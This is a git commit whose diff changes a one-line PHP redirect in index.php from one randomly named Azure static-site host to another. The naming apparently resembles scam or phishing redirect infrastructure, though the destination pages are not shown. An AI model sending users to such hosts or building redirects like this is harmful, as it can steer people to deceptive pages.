1f1c3a3fbb65937824325a9859da594ae42f7ea1
repairprinters379 <repairprinters379@gmail.com>
2025-01-30 22:59:32 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://alt4myacce87core.z21.web.core.windows.net/");
+header("Location: https://app98core87code23fixxx.z13.web.core.windows.net/");
  
 exit;
 ?>
